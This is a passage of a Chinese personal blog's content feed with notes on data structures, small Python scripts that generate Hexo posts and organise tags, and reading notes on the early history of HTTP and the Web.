title="数据结构"></a>数据结构</h2><p>按照视点的不同,我们把数据结构分为：逻辑结构和物理结构。<br>逻辑结构是面向问题的,而物理结构就是面向计算机的,其基本的目标就是将数据及其逻辑关系存储到计算机的内存中。</p><h3 id="逻辑结构-1"><a href="#逻辑结构-1" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>逻辑结构分为：集合结构、线性结构、树形结构、图形结构。<br>逻辑结构是针对具体问题的,是为了解决某个问题，在对问题理解的基础上,选择一个合适的数据结构表示数据元素之间的逻辑关系。</p><h3 id="物理结构（存储结构）"><a href="#物理结构（存储结构）" class="headerlink" title="物理结构（存储结构）"></a>物理结构（存储结构）</h3><p>数据元素的存储结构形式有两种:顺序存储和链式存储。</p><h2 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h2><p>在C语言中,按照取值的不同,数据类型可以分为两类。<br>原子类型:是不可以再分解的基本类型,包括整型、实型、字符型等。<br>结构类型:由若干个类型组合而成,是可以再分解的。例如,整型数组是由若干整型数据组成的。</p><h1 id="同名"><a href="#同名" class="headerlink" title="同名"></a>同名</h1><p>物理结构、存储结构</p><h1 id="最"><a href="#最" class="headerlink" title="最"></a>最</h1><p>最需要关注的问题是逻辑结构。<br>数据的存储结构应正确反映数据元素之间的逻辑关系,这才是最为关键的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小作品：快速生成普通文章</title>
      <link href="/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E6%99%AE%E9%80%9A%E6%96%87%E7%AB%A0/"/>
      <url>/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E6%99%AE%E9%80%9A%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>一键生成小文章啦，不用重复去键入代码或者复制粘贴标题啦。</p><p>小作品：<a href="http://localhost:8888/notebooks/post/genPost.ipynb" target="_blank" rel="noopener">localhost</a> <a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/post/genPost.ipynb" target="_blank" rel="noopener">nbviewer</a> <a href="https://github.com/cjql/myjupyter/blob/master/post/genPost.ipynb" target="_blank" rel="noopener">github</a><br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><p>## </p><h1 id="点评"><a href="#点评" class="headerlink" title="点评"></a>点评</h1><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><h2 id="输入是什么"><a href="#输入是什么" class="headerlink" title="输入是什么"></a>输入是什么</h2><h2 id="给定常量是什么"><a href="#给定常量是什么" class="headerlink" title="给定常量是什么"></a>给定常量是什么</h2><h2 id="输出是什么"><a href="#输出是什么" class="headerlink" title="输出是什么"></a>输出是什么</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小作品：快速生成LeetCode模板</title>
      <link href="/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90LeetCode%E6%A8%A1%E6%9D%BF/"/>
      <url>/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90LeetCode%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>想提高刷题效率，重复工作留给计算机吧</p><p>小作品：<a href="http://localhost:8888/notebooks/post/genLeetCode.ipynb" target="_blank" rel="noopener">localhost</a> <a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/post/genLeetCode.ipynb" target="_blank" rel="noopener">nbviewer</a> <a href="https://github.com/cjql/myjupyter/blob/master/post/genLeetCode.ipynb" target="_blank" rel="noopener">github</a><br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><p>## </p><h1 id="点评"><a href="#点评" class="headerlink" title="点评"></a>点评</h1><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><h2 id="输入是什么"><a href="#输入是什么" class="headerlink" title="输入是什么"></a>输入是什么</h2><h2 id="给定常量是什么"><a href="#给定常量是什么" class="headerlink" title="给定常量是什么"></a>给定常量是什么</h2><h2 id="输出是什么"><a href="#输出是什么" class="headerlink" title="输出是什么"></a>输出是什么</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">title = <span class="string">'univalued-binary-tree'</span></span><br><span class="line">tags = <span class="string">'[leetcode]'</span></span><br><span class="line">abstract = title</span><br><span class="line">dire = <span class="string">'D:\\blog\\source\\_posts\\'</span></span><br><span class="line">head = <span class="string">'''---</span></span><br><span class="line"><span class="string">title: TITLE</span></span><br><span class="line"><span class="string">tags: TAGS</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">TITLE [英文](https://leetcode.com/problems/TITLE/) [中文](https://leetcode-cn.com/problems/TITLE/)</span></span><br><span class="line"><span class="string">&lt;!-- more --&gt;</span></span><br><span class="line"><span class="string">## 简述</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 代码</span></span><br><span class="line"><span class="string">```py</span></span><br></pre></td></tr></table></figure><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>‘’’<br>head = head.replace(‘TITLE’,title)<br>head = head.replace(‘TAGS’,tags)<br>fn = dire + title + ‘.md’<br>with open(fn,’a+’,encoding=’utf8’) as f:<br>    f.write(head)<br>print(‘ok’)<br><code>`</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小作品：快速整理标签</title>
      <link href="/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E6%95%B4%E7%90%86%E6%A0%87%E7%AD%BE/"/>
      <url>/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%BF%AB%E9%80%9F%E6%95%B4%E7%90%86%E6%A0%87%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<p>hexo的标签和分类都不是自己理想的知识整理类型，写个python程序自动整理标签。<br>os.listdir(dire)、re.split(‘[\n ]’,tagsave)、 list(set(tagsOld).difference(set(tagsNew)))、正则子匹配项处理<br>小作品：<a href="http://localhost:8888/notebooks/post/tags.ipynb" target="_blank" rel="noopener">localhost</a> <a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/post/tags.ipynb" target="_blank" rel="noopener">nbviewer</a> <a href="https://github.com/cjql/myjupyter/blob/master/post/tags.ipynb" target="_blank" rel="noopener">github</a><br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><h2 id="os-listdir-dire"><a href="#os-listdir-dire" class="headerlink" title="os.listdir(dire)"></a>os.listdir(dire)</h2><h2 id="re-split-‘-n-’-tagsave"><a href="#re-split-‘-n-’-tagsave" class="headerlink" title="re.split(‘[\n ]’,tagsave)"></a>re.split(‘[\n ]’,tagsave)</h2><h2 id="list-set-tagsOld-difference-set-tagsNew"><a href="#list-set-tagsOld-difference-set-tagsNew" class="headerlink" title="list(set(tagsOld).difference(set(tagsNew)))"></a>list(set(tagsOld).difference(set(tagsNew)))</h2><h2 id="正则子匹配项处理"><a href="#正则子匹配项处理" class="headerlink" title="正则子匹配项处理"></a>正则子匹配项处理</h2><h1 id="点评"><a href="#点评" class="headerlink" title="点评"></a>点评</h1><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><h2 id="输入是什么"><a href="#输入是什么" class="headerlink" title="输入是什么"></a>输入是什么</h2><h2 id="给定常量是什么"><a href="#给定常量是什么" class="headerlink" title="给定常量是什么"></a>给定常量是什么</h2><h2 id="输出是什么"><a href="#输出是什么" class="headerlink" title="输出是什么"></a>输出是什么</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##自动更新标签分类</span></span><br><span class="line"><span class="comment">## (.*?)([ \n])</span></span><br><span class="line"><span class="comment">## [$1](/tags/$1)$2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 获取新的标签列表</span></span><br><span class="line">dire=<span class="string">'D:\\blog\\public\\tags\\'</span></span><br><span class="line">tagsNew=os.listdir(dire)</span><br><span class="line">print(<span class="string">'新标签共有:'</span>,len(tagsNew))</span><br><span class="line"><span class="comment"># print(tagsNew)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取旧的标签列表</span></span><br><span class="line">tagsave=<span class="string">'''空闲扩展 思考</span></span><br><span class="line"><span class="string">achieve todo raw</span></span><br><span class="line"><span class="string">学习笔记 后续学习</span></span><br><span class="line"><span class="string">mind fix</span></span><br><span class="line"><span class="string">核对表</span></span><br><span class="line"><span class="string">数据结构 基本数据类型</span></span><br><span class="line"><span class="string">mysql</span></span><br><span class="line"><span class="string">ML NLP NLTK 文本分析</span></span><br><span class="line"><span class="string">编程基础</span></span><br><span class="line"><span class="string">python python基础 jupyter GUI 爬虫</span></span><br><span class="line"><span class="string">code</span></span><br><span class="line"><span class="string">book web menu github 转载</span></span><br><span class="line"><span class="string">wiki one</span></span><br><span class="line"><span class="string">packtpub</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">tagsOld=re.split(<span class="string">'[\n 、]'</span>,tagsave)</span><br><span class="line">print(<span class="string">'\n整理过的标签共有:'</span>,len(tagsOld))</span><br><span class="line"><span class="comment"># print(tagsOld)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#新旧标签对比</span></span><br><span class="line">old_new=list(set(tagsOld).difference(set(tagsNew)))</span><br><span class="line">print(<span class="string">'\n旧标签有而新标签没有：'</span>,len(old_new))</span><br><span class="line">print(old_new)</span><br><span class="line">new_old=list(set(tagsNew).difference(set(tagsOld)))</span><br><span class="line">print(<span class="string">'\n新标签有而旧标签没有：'</span>,len(new_old))</span><br><span class="line">print(new_old)</span><br><span class="line">refinds=re.findall(<span class="string">'(.*?)([ \n])'</span>,tagsave)</span><br><span class="line"><span class="keyword">for</span> refind <span class="keyword">in</span> refinds:</span><br><span class="line">    tagsave=tagsave.replace(refind[<span class="number">0</span>]+refind[<span class="number">1</span>],<span class="string">'[&#123;&#125;](/tags/&#123;&#125;)&#123;&#125;'</span>.format(refind[<span class="number">0</span>],refind[<span class="number">0</span>],refind[<span class="number">1</span>]))</span><br><span class="line">print(tagsave)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小作品：小作品快速生成</title>
      <link href="/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%B0%8F%E4%BD%9C%E5%93%81%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90/"/>
      <url>/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%B0%8F%E4%BD%9C%E5%93%81%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<p>一键生产小作品。逐步分析，各个击破。<br>换行简要处理、标题替换、摘要、要点、路径、more、要点标题、模板<br>小作品：<a href="http://localhost:8888/notebooks/post/stubAchieve.ipynb" target="_blank" rel="noopener">localhost</a> <a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/post/stubAchieve.ipynb" target="_blank" rel="noopener">nbviewer</a> <a href="https://github.com/cjql/myjupyter/blob/master/post/stubAchieve.ipynb" target="_blank" rel="noopener">github</a><br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><h2 id="换行简要处理"><a href="#换行简要处理" class="headerlink" title="换行简要处理"></a>换行简要处理</h2><h2 id="标题替换"><a href="#标题替换" class="headerlink" title="标题替换"></a>标题替换</h2><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><h2 id="要点-1"><a href="#要点-1" class="headerlink" title="要点"></a>要点</h2><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><h2 id="要点标题"><a href="#要点标题" class="headerlink" title="要点标题"></a>要点标题</h2><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h1 id="点评"><a href="#点评" class="headerlink" title="点评"></a>点评</h1><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><h2 id="输入是什么"><a href="#输入是什么" class="headerlink" title="输入是什么"></a>输入是什么</h2><h2 id="给定常量是什么"><a href="#给定常量是什么" class="headerlink" title="给定常量是什么"></a>给定常量是什么</h2><h2 id="输出是什么"><a href="#输出是什么" class="headerlink" title="输出是什么"></a>输出是什么</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#所有输入</span></span><br><span class="line">title=<span class="string">'列表批量生成文章'</span> <span class="comment">#文章标题</span></span><br><span class="line">abstract=<span class="string">'分类下的元素也想快速做成文章呢，对笔记很有好处的。'</span> <span class="comment">#文章摘要，描述作品是做什么的</span></span><br><span class="line">gist=<span class="string">'每一处改动都赋给新变量、路径注意事项、正则分割与字符串分隔、f.write和f.writeline都需要另外写换行'</span>   <span class="comment">#文章要点，用于生产子标题和快速回顾，注意用顿号分隔</span></span><br><span class="line">url=<span class="string">'post/genPostFromList.ipynb'</span> <span class="comment">#从‘notebooks/’后面截取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#给定常量</span></span><br><span class="line">dire=<span class="string">'D:\\blog\\source\\_posts\\'</span></span><br><span class="line"></span><br><span class="line">head=<span class="string">'''---</span></span><br><span class="line"><span class="string">title: 小作品：TITLE</span></span><br><span class="line"><span class="string">tags: [achieve]</span></span><br><span class="line"><span class="string">---'''</span></span><br><span class="line"></span><br><span class="line">template=<span class="string">'''# 点评</span></span><br><span class="line"><span class="string"># 需求分析</span></span><br><span class="line"><span class="string"># 清单</span></span><br><span class="line"><span class="string">## 输入是什么</span></span><br><span class="line"><span class="string">## 给定常量是什么</span></span><br><span class="line"><span class="string">## 输出是什么</span></span><br><span class="line"><span class="string"># 问题</span></span><br><span class="line"><span class="string"># 源码</span></span><br><span class="line"><span class="string">```py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#————————————head标题替换</span></span><br><span class="line">head=head.replace(<span class="string">'TITLE'</span>,title)</span><br><span class="line"><span class="comment">#————————————摘要无需处理</span></span><br><span class="line"><span class="comment">#————————————要点无需处理</span></span><br><span class="line"><span class="comment">#————————————路径处理。代码的链接</span></span><br><span class="line"><span class="comment"># https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/MySQL.ipynb</span></span><br><span class="line"><span class="comment"># http://localhost:8888/notebooks/MySQL.ipynb</span></span><br><span class="line">urlLocal=<span class="string">'http://localhost:8888/notebooks/'</span>+url</span><br><span class="line">urlNbviewer=<span class="string">'https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/'</span>+url</span><br><span class="line">urlGithub=<span class="string">'https://github.com/cjql/myjupyter/blob/master/'</span>+url</span><br><span class="line">url=<span class="string">'小作品：[本地路径](&#123;&#125;) [nbviewer](&#123;&#125;) [GitHub](&#123;&#125;)'</span>.format(urlLocal,urlNbviewer,urlGithub)</span><br><span class="line"><span class="comment">#————————————生成标题</span></span><br><span class="line">gists=<span class="string">'# 要点\n## '</span>+gist</span><br><span class="line">gists=gists.replace(<span class="string">'、'</span>,<span class="string">'\n## '</span>)</span><br><span class="line"><span class="comment">#————————————后续模板无需处理</span></span><br><span class="line"><span class="comment">#————————————将依次要输出的内容赋给列表，方便打印</span></span><br><span class="line">contents=[head,abstract,gist,url,<span class="string">'&lt;!-- more --&gt;'</span>,gists,template]</span><br><span class="line"><span class="comment">#————————————文件名拼接，注意后缀</span></span><br><span class="line">fn=<span class="string">'&#123;&#125;小作品：&#123;&#125;.md'</span>.format(dire,title)</span><br><span class="line"><span class="comment">#————————————写入文件</span></span><br><span class="line"><span class="keyword">with</span> open(fn,<span class="string">'w'</span>,encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> contents:</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.write(<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小作品：列表批量生成文章</title>
      <link href="/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%88%97%E8%A1%A8%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E7%AB%A0/"/>
      <url>/cs/%E5%B0%8F%E4%BD%9C%E5%93%81%EF%BC%9A%E5%88%97%E8%A1%A8%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>分类下的元素也想快速做成文章呢，对笔记很有好处的。<br>每一处改动都赋给新变量、路径注意事项、正则分割与字符串分隔、f.write和f.writeline都需要另外写换行<br>小作品：<a href="http://localhost:8888/notebooks/post/genPostFromList.ipynb" target="_blank" rel="noopener">localhost</a> <a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/post/genPostFromList.ipynb" target="_blank" rel="noopener">nbviewer</a> <a href="https://github.com/cjql/myjupyter/blob/master/post/genPostFromList.ipynb" target="_blank" rel="noopener">github</a><br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><h2 id="每一处改动都赋给新变量"><a href="#每一处改动都赋给新变量" class="headerlink" title="每一处改动都赋给新变量"></a>每一处改动都赋给新变量</h2><h2 id="路径注意事项"><a href="#路径注意事项" class="headerlink" title="路径注意事项"></a>路径注意事项</h2><h2 id="正则分割与字符串分隔"><a href="#正则分割与字符串分隔" class="headerlink" title="正则分割与字符串分隔"></a>正则分割与字符串分隔</h2><h2 id="f-write和f-writeline都需要另外写换行"><a href="#f-write和f-writeline都需要另外写换行" class="headerlink" title="f.write和f.writeline都需要另外写换行"></a>f.write和f.writeline都需要另外写换行</h2><h1 id="点评"><a href="#点评" class="headerlink" title="点评"></a>点评</h1><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><h2 id="输入是什么"><a href="#输入是什么" class="headerlink" title="输入是什么"></a>输入是什么</h2><h2 id="给定常量是什么"><a href="#给定常量是什么" class="headerlink" title="给定常量是什么"></a>给定常量是什么</h2><h2 id="输出是什么"><a href="#输出是什么" class="headerlink" title="输出是什么"></a>输出是什么</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">titleMind=<span class="string">'基本数据类型'</span></span><br><span class="line">titleChildren=<span class="string">'整数、浮点数、字符、字符串、布尔变量、枚举、具名常量、数组、自定义变量'</span></span><br><span class="line">dire=<span class="string">'D:\\blog\\source\\_posts\\'</span></span><br><span class="line">head=<span class="string">'''---</span></span><br><span class="line"><span class="string">title: TITLE</span></span><br><span class="line"><span class="string">tags: TAGS</span></span><br><span class="line"><span class="string">---'''</span></span><br><span class="line">tagsChild=<span class="string">'[&#123;&#125;,raw]'</span>.format(titleMind)</span><br><span class="line">tagsMind=<span class="string">'[mind,&#123;&#125;]'</span>.format(titleMind)</span><br><span class="line">headChild=head.replace(<span class="string">'TAGS'</span>,tagsChild)</span><br><span class="line">headMind=head.replace(<span class="string">'TAGS'</span>,tagsMind)</span><br><span class="line">titles=re.split(<span class="string">'[，\n、]'</span>,titleChildren)</span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> titles:</span><br><span class="line">    title=<span class="string">'&#123;&#125;'</span>：<span class="string">'&#123;&#125;'</span>.formant(titleMind,title)</span><br><span class="line">    headnew=headChild.replace(<span class="string">'TITLE'</span>,title)  </span><br><span class="line">    fn=<span class="string">'&#123;&#125;&#123;&#125;.md'</span>.format(dire,title)</span><br><span class="line">    <span class="keyword">with</span> open(fn,<span class="string">'a+'</span>,encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(headnew)</span><br><span class="line">        f.write(<span class="string">'\n整理完后记得清掉raw标签哦'</span>)</span><br><span class="line">        f.write(<span class="string">'\n&lt;!-- more --&gt;'</span>) </span><br><span class="line">fnMind=<span class="string">'&#123;&#125;&#123;&#125;.md'</span>.format(dire,titleMind )</span><br><span class="line"><span class="keyword">with</span> open(fnMind,<span class="string">'a+'</span>,encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    headMind=headMind.replace(<span class="string">'TITLE'</span>,titleMind)  </span><br><span class="line">    f.write(headMind)</span><br><span class="line">    f.write(<span class="string">'\n'</span>)</span><br><span class="line">    f.write(<span class="string">'&#123;&#125;一览'</span>.format(titleMind))</span><br><span class="line">    f.write(<span class="string">'\n&lt;!-- more --&gt;'</span>)</span><br><span class="line">    <span class="keyword">for</span> title <span class="keyword">in</span> titles:</span><br><span class="line">        f.write(<span class="string">'[&#123;&#125;](/&#123;&#125;：&#123;&#125;)\n'</span>.format(title,titleMind,title))</span><br><span class="line">print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：图解HTTP</title>
      <link href="/cs/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9B%BE%E8%A7%A3HTTP/"/>
      <url>/cs/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9B%BE%E8%A7%A3HTTP/</url>
      
        <content type="html"><![CDATA[<p>hmm<br><a id="more"></a></p><h1 id="知识清单"><a href="#知识清单" class="headerlink" title="知识清单"></a>知识清单</h1><h2 id="Web-是建立在何种技术之上"><a href="#Web-是建立在何种技术之上" class="headerlink" title="Web 是建立在何种技术之上"></a>Web 是建立在何种技术之上</h2><h2 id="HTTP-协议是如何诞生并发展的。"><a href="#HTTP-协议是如何诞生并发展的。" class="headerlink" title="HTTP 协议是如何诞生并发展的。"></a>HTTP 协议是如何诞生并发展的。</h2><h3 id="为知识共享而规划-Web"><a href="#为知识共享而规划-Web" class="headerlink" title="为知识共享而规划 Web"></a>为知识共享而规划 Web</h3><p>HTTP历史：<br>1989 年 3 月，互联网还只属于少数人。在这一互联网的黎明期，HTTP 诞生了。<br>CERN（欧洲核子研究组织）的蒂姆 • 伯纳斯 - 李（Tim BernersLee）博士提出了一种能让远隔两地的研究者们共享知识的设想。<br>最初设想的基本理念是：借助多文档之间相互关联形成的超文本（HyperText），连成可相互参阅的 WWW（World Wide Web，万维网）。</p><h3 id="Web-成长时代"><a href="#Web-成长时代" class="headerlink" title="Web 成长时代"></a>Web 成长时代</h3><p>1990 年 11 月，CERN 研发了世界上第一台 Web 服务器和 Web 浏览器。<br>1992 年 9 月，日本第一个网站的主页上线了。<a href="http://www.ibarakiken.gr.jp/www/" target="_blank" rel="noopener">http://www.ibarakiken.gr.jp/www/</a><br>1990 年，大家针对 HTML 1.0 草案进行了讨论，因 HTML 1.0 中存在多处模糊不清的部分，草案被直接废弃了。</p><h4 id="HTML1-0"><a href="#HTML1-0" class="headerlink" title="HTML1.0"></a>HTML1.0</h4><p><a href="http://www.w3.org/MarkUp/draft-ietf-iiir-html-01.txt" target="_blank" rel="noopener">http://www.w3.org/MarkUp/draft-ietf-iiir-html-01.txt</a><br>1993 年 1 月，现代浏览器的祖先 NCSA研发的Mosaic 问世了。它以 in-line（内联）等形式显示 HTML 的图像，在图像方面出色的表现使它迅速在世界范围内流行开来。<br>同年秋天，Mosaic 的 Windows 版和 Macintosh 版面世。<br>使用 CGI 技术的 NCSA Web 服务器、NCSA HTTPd 1.0 也差不多是在这个时期出现的。<br>NCSA Mosaic bounce page<a href="http://archive.ncsa.illinois.edu/mosaic.html" target="_blank" rel="noopener">http://archive.ncsa.illinois.edu/mosaic.html</a><br>The NCSA HTTPd Home Page（存档）<a href="http://web.archive.org/web/20090426182129/http://hoohoo.ncsa.illinois.edu/（原址已失效）" target="_blank" rel="noopener">http://web.archive.org/web/20090426182129/http://hoohoo.ncsa.illinois.edu/（原址已失效）</a><br>1994 年 的 12 月，网景通信公司发布了 Netscape Navigator 1.0，<br>1995年微软公司发布 Internet Explorer 1.0 和 2.0。<br>紧随其后的是现在已然成为 Web 服务器标准之一的 Apache，当时它以 Apache 0.2 的姿态出现在世人眼前。<br>而 HTML 也发布了 2.0 版本。<br>那一年，Web 技术的发展突飞猛进。<br>从 1995 年左右起，微软公司与网景通信公司之间爆发的浏览器大战愈演愈烈。两家公司都各自对 HTML 